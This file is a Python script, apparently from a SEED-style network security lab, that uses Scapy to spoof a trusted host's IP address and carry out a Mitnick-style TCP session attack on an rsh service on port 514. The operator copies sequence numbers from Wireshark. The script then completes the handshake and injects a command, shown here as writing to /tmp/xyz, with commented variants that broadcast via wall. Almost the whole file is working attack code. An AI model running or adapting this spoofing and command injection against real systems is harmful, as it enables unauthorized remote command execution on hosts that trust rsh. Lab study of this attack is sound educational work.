from scapy.all import *

def send_syn_packet(src_ip, dst_ip, src_port, dst_port):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create SYN packet
    syn_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="S", seq=1000)

    # Send SYN packet
    send(syn_packet, verbose=0)
    print(f"Sent SYN packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

def send_ack_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create ACK packet to complete the handshake
    ack_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="A", seq=seq_num, ack=ack_num)

    # Send ACK packet
    send(ack_packet, verbose=0)
    print(f"Sent ACK packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

def send_payload_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, payload):
    # Create IP layer with spoofed source IP
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create TCP packet with payload data
    tcp_packet = ip_layer/TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq_num, ack=ack_num) / payload

    # Send the packet
    send(tcp_packet, verbose=0)
    print(f"Sent data packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with payload: {payload}")

def respond_to_syn(src_ip, dst_ip, response_src_port, response_dst_port, syn_seq_num):
    # Respond with SYN-ACK for a received SYN packet
    ack_num = syn_seq_num + 1
    ip_layer = IP(src=src_ip, dst=dst_ip)
    syn_ack_packet = ip_layer/TCP(sport=response_src_port, dport=response_dst_port, flags="SA", seq=1000, ack=ack_num)
    send(syn_ack_packet, verbose=0)
    print(f"Sent SYN-ACK in response to SYN from {dst_ip}")

# Define IP addresses
source_ip = "10.0.2.4"  # Spoofed IP
destination_ip = "10.0.2.5"

# Ports for the first three packets
source_port_first = 1023
destination_port_first = 514

# Ports for the 4th packet
source_port_second = 9090
destination_port_second = 1023

# Send SYN packet
send_syn_packet(source_ip, destination_ip, source_port_first, destination_port_first)

# Print message and instructions for capturing SYN-ACK packet
print("Capture the SYN-ACK packet using Wireshark.")
print("Enter the sequence number and acknowledgment number of the SYN-ACK packet below:")

# Placeholder for user input
syn_ack_seq_num = int(input("Enter the sequence number of the SYN-ACK packet: "))
syn_ack_ack_num = int(input("Enter the acknowledgment number of the SYN-ACK packet: "))

# The ACK packet
# its seq number is equal to the SYN-ACK packet's ACK number
ack_seq_num = syn_ack_ack_num
# its ack number is equal to the SYN-ACK packet's SEQ+1.
ack_ack_num = syn_ack_seq_num + 1

# Send ACK packet to complete handshake
send_ack_packet(source_ip, destination_ip, source_port_first, destination_port_first, ack_seq_num, ack_ack_num)

# Define TCP data to be sent in the 4th packet
# tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' | wall\x00"
# tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' | wall\x00"
tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' > /tmp/xyz\x00"

# Send TCP payload data packet
send_payload_packet(source_ip, destination_ip, source_port_first, destination_port_first, ack_seq_num, ack_ack_num, tcp_payload)

# Print message and instructions for capturing SYN packet
print("Capture the SYN packet using Wireshark.")
print("Enter the sequence number of the SYN packet below:")

# Placeholder for user input
syn_seq_num = int(input("Enter the sequence number of the SYN packet: "))

# Respond to a SYN packet with a SYN-ACK packet
respond_to_syn(source_ip, destination_ip, source_port_second, destination_port_second, syn_seq_num)

